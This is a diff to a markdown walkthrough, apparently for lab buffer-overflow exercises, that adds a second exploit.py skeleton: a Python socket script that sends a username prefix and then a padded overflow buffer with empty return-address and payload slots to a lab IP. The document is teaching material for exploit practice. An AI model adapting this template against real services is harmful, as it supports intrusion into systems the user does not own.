@@ -55,11 +55,12 @@ while True:
   ```
   
 #### Step 5: Create exploit.py skeleton:
+*Most likley, the examples provided will have to be motified in some way since every program is different*
  
-Example exploit.py :
+exploit.py Example 1:
  
- ```
- import socket
+```
+import socket
 
 ip = "10.10.237.191"
 port = 1337
@@ -83,7 +84,39 @@ try:
   print("Done!")
 except:
   print("Could not connect.")
-  ```
+```
+ 
+ exploit.py Example 2:
+ 
+```
+import socket
+
+ip = "10.10.96.43"
+port = 9999
+
+prefix = "username"
+offset = 0   
+overflow = "A" * offset
+retn = ""   
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+ s.connect((ip, port))
+ print("Sending buffer...")
+ s.recv(1024)
+ s.send(bytes(prefix + "\r", "latin-1"))
+ s.recv(1024)
+ s.send(bytes(buffer + "\r\n", "latin-1"))
+ print("Done!")
+except:
+ print("Could not connect.")
+```
   
 #### Step 6: Generate cyclic pattern with this command:
 
